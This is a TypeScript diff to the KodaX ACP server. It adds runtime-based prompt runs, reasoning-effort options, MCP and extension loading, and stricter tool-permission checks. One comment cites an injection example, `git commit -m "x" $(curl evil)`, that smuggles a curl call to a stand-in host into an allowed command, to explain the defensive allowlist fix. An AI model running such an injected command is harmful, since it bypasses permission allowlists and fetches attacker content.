@@ -1,4 +1,5 @@
 import { randomUUID } from 'node:crypto';
+import os from 'node:os';
 import path from 'node:path';
 import process from 'node:process';
 import { Readable, Writable } from 'node:stream';
@@ -31,8 +32,21 @@ import {
   type KodaXContextTokenSnapshot,
   type KodaXOptions,
   type KodaXReasoningMode,
-  runKodaX,
-} from '@kodax/coding';
+  type KodaXWireReasoningEffort,
+  isToolFileMutation,
+  normalizeReasoningEffortValue,
+  parseReasoningEffortEnv,
+  combineExtensionRuntimes,
+  createExtensionRuntime,
+  dedupeExtensionPathsByEntrypoint,
+  discoverDefaultExtensions,
+  excludeExtensionPathsByEntrypoint,
+  registerConfiguredMcpCapabilityProvider,
+  buildMcpReverseCapabilities,
+  shutdownDefaultLspService,
+  type CombinedExtensionRuntime,
+  type KodaXExtensionRuntime,
+} from '@kodax-ai/coding';
 import {
   computeConfirmTools,
   FileSessionStorage,
@@ -45,7 +59,16 @@ import {
   isPathInsideProject,
   isToolCallAllowed,
   prepareRuntimeConfig,
-} from '@kodax/repl';
+  resolveRuntimeEffortSelection,
+  resolveRuntimeModelSelection,
+  resolveRuntimeProviderSelection,
+  KODAX_CONFIG_FILE,
+} from '@kodax-ai/repl';
+import {
+  createBashPrefixExtractor,
+  resolveProvider,
+  type BashPrefixExtractor,
+} from '@kodax-ai/coding';
 import {
   AcpLogger,
   resolveAcpLogLevel,
@@ -55,11 +78,45 @@ import {
   AcpEventEmitter,
   type AcpEventSink,
 } from './acp_events.js';
+import {
+  createKodaXRuntime,
+  type KodaXRuntime,
+  type RuntimeRunHandle,
+  type RuntimeRunPhase,
+} from './sdk-runtime.js';
 
+/**
+ * Permission mode ids exposed to ACP clients. These are wire-protocol values
+ * advertised in `SessionMode.id`, so the set is intentionally narrower than
+ * the canonical `PermissionMode` from `@kodax-ai/repl`.
+ *
+ * Why `'auto'` (canonical FEATURE_092 v0.7.33) is **not** here:
+ *
+ *   1. ACP's auto-mode classifier path requires an interactive `askUser`
+ *      surface (the readline confirm prompt or Ink confirm dialog).
+ *      `KodaXAcpServer` runs out-of-process and routes confirmations through
+ *      `connection.requestPermission` — a different protocol that has no
+ *      structural place for the classifier-escalate `<reason>` payload.
+ *   2. ACP clients that want auto-style behavior continue to use the
+ *      legacy alias `'auto-in-project'`, which goes through
+ *      `evaluateToolPermission` → `requestPermissionFromClient` (no LLM
+ *      classifier, identical pre-v0.7.33 semantics).
+ *   3. Once an ACP-native classifier-escalate channel lands, `'auto'` will
+ *      be added here as a third id without breaking existing clients.
+ */
 export const ACP_PERMISSION_MODE_IDS = ['plan', 'accept-edits', 'auto-in-project'] as const;
-type AcpPermissionMode = (typeof ACP_PERMISSION_MODE_IDS)[number];
+export type AcpPermissionMode = (typeof ACP_PERMISSION_MODE_IDS)[number];
 
-const ACP_TOOL_FILE_MODIFICATION_TOOLS = new Set(['write', 'edit']);
+// v0.7.42 — replaced the hardcoded `Set(['write', 'edit'])` with the
+// metadata-driven `isToolFileMutation` from `@kodax-ai/coding`. The old
+// 2-element list silently under-classified `multi_edit`,
+// `insert_after_anchor`, `undo`, `worktree_*`, construction-staircase
+// writes, etc. — ACP clients were not asked for protected-path / outside-
+// project confirmation on those tools. The metadata path auto-syncs as
+// new write tools are added.
+function acpIsFileModificationTool(toolName: string): boolean {
+  return isToolFileMutation(toolName);
+}
 const ACP_TOOL_KIND_MAP: Record<string, ToolKind> = {
   read: 'read',
   write: 'edit',
@@ -95,6 +152,10 @@ export interface KodaXAcpServerOptions {
   provider?: string;
   /** Optional model override forwarded to the coding runtime. */
   model?: string;
+  /** Optional default reasoning effort forwarded to the coding runtime. */
+  effort?: KodaXWireReasoningEffort;
+  /** Optional plan-mode default; ignored when `effort` is provided directly. */
+  planModeEffort?: KodaXWireReasoningEffort;
   thinking?: boolean;
   reasoningMode?: KodaXReasoningMode;
   /**
@@ -109,8 +170,13 @@ export interface KodaXAcpServerOptions {
   eventSinks?: AcpEventSink[];
   agentName?: string;
   agentVersion?: string;
+  /** Base home used by the owned Runtime. Primarily useful for isolated hosts and tests. */
+  homeDir?: string;
   storage?: FileSessionStorage;
+  runtime?: KodaXRuntime;
 }
+
+type AcpPromptExtensionRuntime = KodaXExtensionRuntime | CombinedExtensionRuntime;
 
 interface KodaXAcpSessionState {
   sessionId: string;
@@ -118,8 +184,147 @@ interface KodaXAcpSessionState {
   permissionMode: AcpPermissionMode;
   mcpServers: McpServer[];
   alwaysAllowTools: string[];
-  activeController: AbortController | null;
+  activeRunIds: Set<string>;
+  /** Created lazily on the first valid prompt so handshake-only sessions stay in memory. */
+  runtimeSessionReady?: Promise<void>;
   contextTokenSnapshot?: KodaXContextTokenSnapshot;
+  /** Runtime view used for prompts when client provides per-session MCP servers. */
+  extensionRuntime?: AcpPromptExtensionRuntime;
+  /** Per-session MCP runtime owned by this session and disposed with it. */
+  ownedExtensionRuntime?: KodaXExtensionRuntime;
+}
+
+type AcpPromptRequestWithEffort = PromptRequest & {
+  effort?: unknown;
+};
+
+type AcpPromptEffortOverride =
+  | { readonly kind: 'absent' }
+  | { readonly kind: 'value'; readonly value?: KodaXWireReasoningEffort };
+
+function normalizeOptionalEffort(
+  value: unknown,
+  label: string,
+): KodaXWireReasoningEffort | undefined {
+  if (value === undefined || value === null) {
+    return undefined;
+  }
+  if (typeof value !== 'string') {
+    throw new Error(`${label} must be a string.`);
+  }
+  const normalized = normalizeReasoningEffortValue(value);
+  return normalized === 'auto' ? undefined : normalized;
+}
+
+function buildAcpSessionTitle(prompt: string): string {
+  const singleLine = prompt.replace(/\s+/g, ' ').trim();
+  return singleLine.length <= 80 ? singleLine : `${singleLine.slice(0, 77)}...`;
+}
+
+function resolvePromptEffortOverride(params: PromptRequest): AcpPromptEffortOverride {
+  const rawEffort = (params as AcpPromptRequestWithEffort).effort;
+  if (rawEffort === undefined) {
+    return { kind: 'absent' };
+  }
+  try {
+    return {
+      kind: 'value',
+      value: normalizeOptionalEffort(rawEffort, 'Prompt effort'),
+    };
+  } catch (error) {
+    const message = error instanceof Error ? error.message : String(error);
+    throw RequestError.invalidParams({ effort: rawEffort }, message);
+  }
+}
+
+/** Convert ACP McpServer[] to KodaX flat server config. */
+function convertAcpMcpServers(
+  servers: McpServer[],
+): import('@kodax-ai/coding').KodaXMcpServersConfig {
+  const result: import('@kodax-ai/coding').KodaXMcpServersConfig = {};
+  for (const server of servers) {
+    if ('command' in server) {
+      // Stdio
+      const envMap: Record<string, string> = {};
+      for (const entry of server.env ?? []) {
+        envMap[entry.name] = entry.value;
+      }
+      result[server.name] = {
+        type: 'stdio',
+        command: server.command,
+        args: server.args ?? [],
+        env: Object.keys(envMap).length > 0 ? envMap : undefined,
+      };
+    } else if ('type' in server && server.type === 'sse') {
+      const headerMap: Record<string, string> = {};
+      for (const h of (server as { headers?: Array<{ name: string; value: string }> }).headers ?? []) {
+        headerMap[h.name] = h.value;
+      }
+      result[server.name] = {
+        type: 'sse',
+        url: server.url,
+        headers: Object.keys(headerMap).length > 0 ? headerMap : undefined,
+      };
+    } else if ('type' in server && server.type === 'http') {
+      const headerMap: Record<string, string> = {};
+      for (const h of (server as { headers?: Array<{ name: string; value: string }> }).headers ?? []) {
+        headerMap[h.name] = h.value;
+      }
+      result[server.name] = {
+        type: 'http',
+        url: server.url,
+        headers: Object.keys(headerMap).length > 0 ? headerMap : undefined,
+      };
+    }
+  }
+  return result;
+}
+
+function dedupeExtensionPaths(paths: string[]): string[] {
+  const result: string[] = [];
+  for (const value of paths) {
+    const normalized = value.trim();
+    if (normalized && !result.includes(normalized)) {
+      result.push(normalized);
+    }
+  }
+  return result;
+}
+
+function normalizeConfiguredExtensionPaths(value: unknown): string[] {
+  if (!Array.isArray(value)) {
+    return [];
+  }
+
+  return dedupeExtensionPaths(
+    value
+      .filter((entry): entry is string => typeof entry === 'string' && entry.trim().length > 0)
+      .map((entry) => path.isAbsolute(entry) ? entry : path.resolve(path.dirname(KODAX_CONFIG_FILE), entry)),
+  );
+}
+
+async function discoverAcpDefaultExtensions(logger: Pick<AcpLogger, 'error'>): Promise<string[]> {
+  try {
+    return await discoverDefaultExtensions();
+  } catch (error) {
+    const message = error instanceof Error ? error.message : String(error);
+    logger.error('ACP extension discovery failed: ' + message);
+    return [];
+  }
+}
+
+async function loadAcpExtensionGroups(
+  runtime: KodaXExtensionRuntime,
+  discoveredExtensions: string[],
+  configuredExtensions: string[],
+): Promise<void> {
+  const configured = await dedupeExtensionPathsByEntrypoint(configuredExtensions);
+  const discoveredOnly = await excludeExtensionPathsByEntrypoint(
+    await dedupeExtensionPathsByEntrypoint(discoveredExtensions),
+    configured,
+  );
+  await runtime.loadExtensions(discoveredOnly, { continueOnError: true, loadSource: 'discovery' });
+  await runtime.loadExtensions(configured, { continueOnError: true, loadSource: 'config' });
 }
 
 interface ToolPermissionDecision {
@@ -161,7 +366,7 @@ function inferToolKind(toolName: string): ToolKind {
 }
 
 function inferToolLocations(toolName: string, input: Record<string, unknown>): Array<{ path: string }> | undefined {
-  if (ACP_TOOL_FILE_MODIFICATION_TOOLS.has(toolName)) {
+  if (acpIsFileModificationTool(toolName)) {
     const targetPath = typeof input.path === 'string' ? input.path : undefined;
     return targetPath ? [{ path: targetPath }] : undefined;
   }
@@ -225,6 +430,12 @@ function isAbortLikeError(error: unknown): boolean {
   );
 }
 
+function acpAbortPhaseRank(phase: RuntimeRunPhase): number {
+  if (phase === 'queued') return 0;
+  if (phase === 'running' || phase === 'waiting_permission' || phase === 'waiting_user_input') return 1;
+  return 2;
+}
+
 function toAcpUsage(snapshot: KodaXContextTokenSnapshot | undefined): PromptResponse['usage'] | undefined {
   const usage = snapshot?.usage;
   if (!usage) {
@@ -244,6 +455,8 @@ function toAcpUsage(snapshot: KodaXContextTokenSnapshot | undefined): PromptResp
 export class KodaXAcpServer implements Agent {
   private readonly provider: string;
   private readonly model?: string;
+  private readonly effort?: KodaXWireReasoningEffort;
+  private readonly planModeEffort?: KodaXWireReasoningEffort;
   private readonly thinking: boolean;
   private readonly reasoningMode: KodaXReasoningMode;
   private readonly defaultPermissionMode: AcpPermissionMode;
@@ -252,34 +465,130 @@ export class KodaXAcpServer implements Agent {
   private readonly agentName: string;
   private readonly agentVersion: string;
   private readonly storage: FileSessionStorage;
+  private readonly runtimeReady: Promise<KodaXRuntime>;
+  private readonly ownsRuntime: boolean;
+  private readonly logger: AcpLogger;
   private readonly events: AcpEventEmitter;
+  /**
+   * FEATURE_153 (v0.7.38) — LLM-backed bash prefix extractor used by
+   * `isToolCallAllowed` to match allowlist patterns against the extracted
+   * safe prefix instead of naive `command.startsWith`. Server-scoped (one
+   * per `KodaXAcpServer` instance) so the LRU cache is shared across all
+   * sessions, mirroring the REPL's session-scoped pattern.
+   */
+  private readonly bashPrefixExtractor: BashPrefixExtractor;
+  private readonly configuredExtensions: string[];
+  private readonly discoveredExtensions: Promise<string[]>;
 
   private connection: AgentSideConnection | null = null;
   private readonly sessions = new Map<string, KodaXAcpSessionState>();
-  private promptQueue: Promise<unknown> = Promise.resolve();
+  private extensionRuntime?: KodaXExtensionRuntime;
+  private extensionRuntimeReady?: Promise<void>;
+  private disposePromise?: Promise<void>;
 
   constructor(options: KodaXAcpServerOptions = {}) {
+    const environmentProvider = process.env.KODAX_PROVIDER;
+    const environmentEffort = process.env.KODAX_EFFORT;
     const config = prepareRuntimeConfig();
-    this.provider = options.provider ?? config.provider ?? KODAX_DEFAULT_PROVIDER;
-    this.model = options.model;
+    const configWithExtensions = config as typeof config & { extensions?: unknown };
+    this.provider = resolveRuntimeProviderSelection({
+      explicitProvider: options.provider,
+      environmentProvider,
+      configuredProvider: config.provider,
+      defaultProvider: KODAX_DEFAULT_PROVIDER,
+    });
+    this.model = resolveRuntimeModelSelection({
+      explicitProvider: options.provider,
+      environmentProvider,
+      explicitModel: options.model,
+      configuredProvider: config.provider,
+      configuredModel: config.model,
+    });
+    const hasExplicitEffort = options.effort !== undefined
+      || parseReasoningEffortEnv(environmentEffort).kind === 'value';
+    this.effort = normalizeOptionalEffort(resolveRuntimeEffortSelection({
+      explicitEffort: options.effort,
+      environmentEffort,
+      configuredEffort: config.effort,
+    }), 'Configured effort');
+    this.planModeEffort = hasExplicitEffort
+      ? undefined
+      : normalizeOptionalEffort(
+          options.planModeEffort ?? config.planModeEffort,
+          'Configured plan-mode effort',
+        );
     this.thinking = options.thinking ?? config.thinking ?? false;
     this.reasoningMode = options.reasoningMode ?? config.reasoningMode ?? 'auto';
     this.defaultPermissionMode = normalizeAcpPermissionMode(
       options.permissionMode ?? config.permissionMode,
       'accept-edits',
     );
-    this.defaultCwd = path.resolve(options.cwd ?? process.cwd());
+    const defaultCwd = path.resolve(options.cwd ?? process.cwd());
+    const configuredExtensions = normalizeConfiguredExtensionPaths(configWithExtensions.extensions);
+    const logger = new AcpLogger({
+      level: resolveAcpLogLevel(options.logLevel ?? process.env.KODAX_ACP_LOG, 'info'),
+    });
+    const discoveredExtensionsPromise = discoverAcpDefaultExtensions(logger);
+
+    this.defaultCwd = defaultCwd;
     this.hasFixedCwd = options.cwd !== undefined;
     this.agentName = options.agentName ?? 'kodax-acp-server';
     this.agentVersion = options.agentVersion ?? '0.0.0';
     this.storage = options.storage ?? new FileSessionStorage();
+    this.logger = logger;
+    this.ownsRuntime = options.runtime === undefined;
+    this.runtimeReady = options.runtime
+      ? Promise.resolve(options.runtime)
+      : createKodaXRuntime({
+          homeDir: options.homeDir ?? os.homedir(),
+          sessionsDir: this.storage.getSessionsDir(),
+          profile: 'acp',
+          defaultProvider: this.provider,
+          ...(this.model !== undefined ? { defaultModel: this.model } : {}),
+        });
+    this.configuredExtensions = configuredExtensions;
+    this.discoveredExtensions = discoveredExtensionsPromise;
     this.events = new AcpEventEmitter({
       sinks: [
         ...(options.eventSinks ?? []),
-        new AcpLogger({
-          level: resolveAcpLogLevel(options.logLevel ?? process.env.KODAX_ACP_LOG, 'info'),
-        }),
+        logger,
       ],
+    });
+
+    // FEATURE_153 (v0.7.38): build the bash prefix extractor once at server
+    // construction. ACP sessions share the cache across the server lifetime
+    // (one server per process; the LRU cap of 200 keeps memory bounded).
+    this.bashPrefixExtractor = createBashPrefixExtractor({
+      getProvider: () => resolveProvider(this.provider),
+      getModel: () => this.model ?? '',
+    });
+
+    // Initialize extension runtime (non-blocking). Default/config extensions
+    // share the same runtime as configured MCP so tool/capability surfaces stay
+    // consistent across CLI, ACP, and desktop-style hosts.
+    const mcpServers = config.mcpServers;
+    const hasMcp = mcpServers && Object.values(mcpServers).some(
+      (s) => (s.connect ?? 'lazy') !== 'disabled',
+    );
+    this.extensionRuntimeReady = (async () => {
+      const discoveredExtensions = await discoveredExtensionsPromise;
+      const hasExtensions = discoveredExtensions.length > 0 || configuredExtensions.length > 0;
+      if (!hasMcp && !hasExtensions) {
+        return;
+      }
+
+      const rt = createExtensionRuntime({ config });
+      if (hasMcp) {
+        await registerConfiguredMcpCapabilityProvider(rt, mcpServers, {
+          reverse: buildMcpReverseCapabilities({ cwd: defaultCwd }),
+        });
+      }
+      await loadAcpExtensionGroups(rt, discoveredExtensions, configuredExtensions);
+      rt.activate();
+      this.extensionRuntime = rt;
+    })().catch((error) => {
+      const message = error instanceof Error ? error.message : String(error);
+      logger.error('ACP extension initialization failed: ' + message);
     });
   }
 
@@ -290,6 +599,8 @@ export class KodaXAcpServer implements Agent {
     const stream = ndJsonStream(output, input);
     const connection = new AgentSideConnection(() => this, stream);
     this.connection = connection;
+    const attachedThinking = this.effort === 'none' ? false : this.thinking;
+    const attachedReasoningMode = this.effort === 'none' ? 'off' : this.reasoningMode;
     this.events.emit({
       type: 'server_attached',
       agent: this.agentName,
@@ -298,24 +609,63 @@ export class KodaXAcpServer implements Agent {
       model: this.model ?? '(default)',
       cwd: this.defaultCwd,
       permissionMode: this.defaultPermissionMode,
-      reasoningMode: this.reasoningMode,
-      thinking: this.thinking,
+      reasoningMode: attachedReasoningMode,
+      thinking: attachedThinking,
       fixedCwd: this.hasFixedCwd,
     });
     connection.signal.addEventListener('abort', () => {
-      this.sessions.forEach((session) => session.activeController?.abort());
+      const activeSessions = this.sessions.size;
       this.events.emit({
         type: 'connection_closed',
-        activeSessions: this.sessions.size,
+        activeSessions,
       });
-      this.sessions.clear();
-      this.connection = null;
+      void this.dispose();
     });
     return connection;
   }
 
   async waitForClose(): Promise<void> {
     await this.connection?.closed;
+  }
+
+  async dispose(): Promise<void> {
+    if (this.disposePromise) {
+      return this.disposePromise;
+    }
+
+    this.disposePromise = (async () => {
+      for (const session of this.sessions.values()) {
+        await this.abortSessionRuns(session);
+      }
+
+      const runtimes = new Set<KodaXExtensionRuntime>();
+      for (const session of this.sessions.values()) {
+        if (session.ownedExtensionRuntime) {
+          runtimes.add(session.ownedExtensionRuntime);
+          session.ownedExtensionRuntime = undefined;
+        }
+        session.extensionRuntime = undefined;
+      }
+      this.sessions.clear();
+      this.connection = null;
+
+      const ready = this.extensionRuntimeReady;
+      this.extensionRuntimeReady = undefined;
+      await ready?.catch(() => undefined);
+
+      if (this.extensionRuntime) {
+        runtimes.add(this.extensionRuntime);
+        this.extensionRuntime = undefined;
+      }
+
+      await Promise.all([...runtimes].map((runtime) => runtime.dispose()));
+      if (this.ownsRuntime) {
+        await (await this.runtimeReady).close().catch(() => undefined);
+      }
+      await shutdownDefaultLspService();
+    })();
+
+    return this.disposePromise;
   }
 
   async initialize(_params: InitializeRequest): Promise<InitializeResponse> {
@@ -349,14 +699,36 @@ export class KodaXAcpServer implements Agent {
     }
 
     const sessionId = randomUUID();
+    const clientMcpServers = params.mcpServers ?? [];
     const session: KodaXAcpSessionState = {
       sessionId,
       cwd: path.resolve(requestedCwd),
       permissionMode: this.defaultPermissionMode,
-      mcpServers: params.mcpServers ?? [],
+      mcpServers: clientMcpServers,
       alwaysAllowTools: [],
-      activeController: null,
+      activeRunIds: new Set(),
     };
+
+    // If the client provides per-session MCP servers, keep that MCP runtime
+    // session-owned and compose it with the already-activated global runtime.
+    // Global extensions are not loaded again, so sidecar-style extensions stay
+    // single-instance in the ACP process.
+    if (clientMcpServers.length > 0) {
+      const converted = convertAcpMcpServers(clientMcpServers);
+      const rt = createExtensionRuntime({});
+      await registerConfiguredMcpCapabilityProvider(rt, converted, {
+        reverse: buildMcpReverseCapabilities({ cwd: session.cwd }),
+      }).catch((error) => {
+        const msg = error instanceof Error ? error.message : String(error);
+        this.logger.error('ACP per-session MCP init failed for ' + sessionId + ': ' + msg);
+      });
+      await this.extensionRuntimeReady;
+      session.ownedExtensionRuntime = rt;
+      session.extensionRuntime = this.extensionRuntime
+        ? combineExtensionRuntimes(rt, this.extensionRuntime)
+        : rt;
+    }
+
     this.sessions.set(sessionId, session);
     this.events.emit({
       type: 'session_created',
@@ -400,28 +772,16 @@ export class KodaXAcpServer implements Agent {
   async prompt(params: PromptRequest): Promise<PromptResponse> {
     const session = this.requireSession(params.sessionId);
     const promptText = extractPromptText(params.prompt);
+    const promptEffortOverride = resolvePromptEffortOverride(params);
     if (!promptText) {
       throw RequestError.invalidParams(
         { prompt: params.prompt },
         'Prompt must include at least one text or resource block with content.',
       );
     }
-    const abortController = new AbortController();
-    session.activeController = abortController;
     const promptQueuedAt = Date.now();
 
     const task = async (): Promise<PromptResponse> => {
-      if (abortController.signal.aborted) {
-        this.events.emit({
-          type: 'prompt_skipped',
-          sessionId: session.sessionId,
-        });
-        return {
-          stopReason: 'cancelled',
-          userMessageId: params.messageId ?? undefined,
-        };
-      }
-
       const promptStartedAt = Date.now();
       this.events.emit({
         type: 'prompt_started',
@@ -437,14 +797,43 @@ export class KodaXAcpServer implements Agent {
         prompt: promptText,
       });
 
+      let handle: RuntimeRunHandle | undefined;
       try {
-        const result = await runKodaX(
-          this.buildKodaXOptions(session, abortController.signal),
-          promptText,
-        );
+        // Ensure MCP is initialized before the first prompt.
+        if (this.extensionRuntimeReady) {
+          await this.extensionRuntimeReady;
+        }
+        const runtime = await this.runtimeReady;
+        await this.ensureRuntimeSession(runtime, session, promptText);
+        handle = await runtime.runs.start({
+          sessionId: session.sessionId,
+          prompt: promptText,
+          options: this.buildKodaXOptions(session, promptEffortOverride),
+        });
+        session.activeRunIds.add(handle.runId);
+        const runtimeResult = await handle.result;
+        if (runtimeResult.error) {
+          throw runtimeResult.error;
+        }
+        const cancelled = runtimeResult.phase === 'cancelled' || runtimeResult.phase === 'interrupted';
+        const result = runtimeResult.result;
+        if (!result) {
+          if (cancelled) {
+            this.events.emit({
+              type: 'prompt_cancelled',
+              sessionId: session.sessionId,
+              durationMs: Date.now() - promptStartedAt,
+            });
+            return {
+              stopReason: 'cancelled',
+              userMessageId: params.messageId ?? undefined,
+            };
+          }
+          throw new Error(`Runtime run ${handle.runId} ended without a coding result.`);
+        }
         session.contextTokenSnapshot = result.contextTokenSnapshot;
-        const interrupted = !!result.interrupted;
-        const stopReason = abortController.signal.aborted || interrupted ? 'cancelled' : 'end_turn';
+        const interrupted = !!result.interrupted || cancelled;
+        const stopReason = interrupted ? 'cancelled' : 'end_turn';
         this.events.emit({
           type: 'prompt_finished',
           sessionId: session.sessionId,
@@ -459,7 +848,7 @@ export class KodaXAcpServer implements Agent {
           ...(toAcpUsage(result.contextTokenSnapshot) ? { usage: toAcpUsage(result.contextTokenSnapshot) } : {}),
         };
       } catch (error) {
-        if (abortController.signal.aborted || isAbortLikeError(error)) {
+        if (isAbortLikeError(error)) {
           this.events.emit({
             type: 'prompt_cancelled',
             sessionId: session.sessionId,
@@ -480,17 +869,39 @@ export class KodaXAcpServer implements Agent {
         });
         await this.sendTextChunk(session.sessionId, `\n[ACP Server Error] ${message}\n`);
         return {
-          stopReason: abortController.signal.aborted ? 'cancelled' : 'end_turn',
+          stopReason: 'end_turn',
           userMessageId: params.messageId ?? undefined,
         };
       } finally {
-        session.activeController = null;
+        if (handle) {
+          session.activeRunIds.delete(handle.runId);
+        }
       }
     };
 
-    const queued = this.promptQueue.then(task, task);
-    this.promptQueue = queued.then(() => undefined, () => undefined);
-    return queued;
+    return task();
+  }
+
+  private async ensureRuntimeSession(
+    runtime: KodaXRuntime,
+    session: KodaXAcpSessionState,
+    prompt: string,
+  ): Promise<void> {
+    if (!session.runtimeSessionReady) {
+      session.runtimeSessionReady = runtime.sessions.create({
+        sessionId: session.sessionId,
+        title: buildAcpSessionTitle(prompt),
+        projectPath: session.cwd,
+        gitRoot: session.cwd,
+        surface: 'acp',
+      }).then(() => undefined);
+    }
+    try {
+      await session.runtimeSessionReady;
+    } catch (error) {
+      session.runtimeSessionReady = undefined;
+      throw error;
+    }
   }
 
   async cancel(params: { sessionId: string }): Promise<void> {
@@ -498,9 +909,38 @@ export class KodaXAcpServer implements Agent {
     this.events.emit({
       type: 'cancel_requested',
       sessionId: params.sessionId,
-      active: !!session?.activeController,
+      active: (session?.activeRunIds.size ?? 0) > 0,
     });
-    session?.activeController?.abort();
+    if (session) {
+      await this.abortSessionRuns(session);
+    }
+  }
+
+  private async abortSessionRuns(session: KodaXAcpSessionState): Promise<void> {
+    if (session.activeRunIds.size === 0) return;
+
+    const runtime = await this.runtimeReady;
+    const runIds = [...session.activeRunIds];
+    const abortTargets = await Promise.all(
+      runIds.map(async (runId) => {
+        try {
+          const status = await runtime.runs.get(runId);
+          return { runId, rank: acpAbortPhaseRank(status.phase) };
+        } catch (error) {
+          const message = error instanceof Error ? error.message : String(error);
+          this.logger.error(`ACP runtime run status lookup failed for ${runId}: ${message}`);
+          return { runId, rank: acpAbortPhaseRank('cancelled') };
+        }
+      }),
+    );
+
+    abortTargets.sort((left, right) => left.rank - right.rank);
+    await Promise.all(
+      abortTargets.map(({ runId }) => runtime.runs.abort(runId).catch((error: unknown) => {
+        const message = error instanceof Error ? error.message : String(error);
+        this.logger.error(`ACP runtime run abort failed for ${runId}: ${message}`);
+      })),
+    );
   }
 
   private requireSession(sessionId: string): KodaXAcpSessionState {
@@ -511,14 +951,23 @@ export class KodaXAcpServer implements Agent {
     return session;
   }
 
-  private buildKodaXOptions(session: KodaXAcpSessionState, abortSignal: AbortSignal): KodaXOptions {
+  private buildKodaXOptions(
+    session: KodaXAcpSessionState,
+    effortOverride: AcpPromptEffortOverride = { kind: 'absent' },
+  ): KodaXOptions {
+    const effort = effortOverride.kind === 'value'
+      ? effortOverride.value
+      : session.permissionMode === 'plan' && this.planModeEffort !== undefined
+        ? this.planModeEffort
+        : this.effort;
     return {
       provider: this.provider,
       model: this.model,
-      thinking: this.thinking,
-      reasoningMode: this.reasoningMode,
-      parallel: false,
-      abortSignal,
+      effort,
+      thinking: effort === 'none' ? false : this.thinking,
+      reasoningMode: effort === 'none' ? 'off' : this.reasoningMode,
+      // Per-session runtime (from client MCP servers) takes precedence over global.
+      extensionRuntime: session.extensionRuntime ?? this.extensionRuntime,
       session: {
         id: session.sessionId,
         storage: this.storage,
@@ -583,6 +1032,19 @@ export class KodaXAcpServer implements Agent {
             }),
           );
         },
+        onRepoIntelligenceTrace: (event) => {
+          this.events.emit({
+            type: 'repo_intelligence_trace',
+            sessionId: session.sessionId,
+            stage: event.stage,
+            summary: event.summary,
+            mode: event.capability?.mode,
+            engine: event.capability?.engine,
+            status: event.capability?.status,
+            cacheHit: event.trace?.cacheHit,
+            capsuleEstimatedTokens: event.trace?.capsuleEstimatedTokens,
+          });
+        },
         onError: (error) => {
           this.dispatchNotification(
             'error text chunk',
@@ -627,7 +1089,17 @@ export class KodaXAcpServer implements Agent {
         return { allowed: true };
       }
 
-      if (isToolCallAllowed(toolName, input, session.alwaysAllowTools)) {
+      // FEATURE_153 (v0.7.38): pass extractor so allowlist patterns match
+      // against the LLM-extracted safe prefix, closing the injection surface
+      // (`git commit -m "x" $(curl evil)` no longer matches `git commit:*`).
+      if (
+        await isToolCallAllowed(
+          toolName,
+          input,
+          session.alwaysAllowTools,
+          this.bashPrefixExtractor,
+        )
+      ) {
         this.events.emit({
           type: 'tool_permission_resolved',
           sessionId: session.sessionId,
@@ -665,7 +1137,7 @@ export class KodaXAcpServer implements Agent {
     }
 
     const needsProtectedPathConfirmation =
-      ACP_TOOL_FILE_MODIFICATION_TOOLS.has(toolName) &&
+      acpIsFileModificationTool(toolName) &&
       typeof input.path === 'string' &&
       isAlwaysConfirmPath(path.resolve(session.cwd, input.path), session.cwd);
 
@@ -673,7 +1145,7 @@ export class KodaXAcpServer implements Agent {
     const needsAutoOutsideProjectConfirmation =
       session.permissionMode === 'auto-in-project' &&
       (
-        (ACP_TOOL_FILE_MODIFICATION_TOOLS.has(toolName) &&
+        (acpIsFileModificationTool(toolName) &&
           typeof input.path === 'string' &&
           !isPathInsideProject(input.path, session.cwd)) ||
         (toolName === 'bash' &&
@@ -760,13 +1232,14 @@ export class KodaXAcpServer implements Agent {
         toolCall,
         options: permissionOptions,
       });
-    } catch {
+    } catch (error) {
       this.events.emit({
         type: 'tool_permission_resolved',
         sessionId: session.sessionId,
         tool: toolName,
         toolId: toolCall.toolCallId,
         outcome: 'request_failed_incomplete',
+        error: error instanceof Error ? error.message : String(error),
       });
       return {
         allowed: false,
@@ -863,5 +1336,9 @@ export async function runAcpServer(options: KodaXAcpServerOptions = {}): Promise
   const input = Readable.toWeb(process.stdin) as ReadableStream<Uint8Array>;
   const output = Writable.toWeb(process.stdout) as WritableStream<Uint8Array>;
   server.attach(input, output);
-  await server.waitForClose();
+  try {
+    await server.waitForClose();
+  } finally {
+    await server.dispose();
+  }
 }
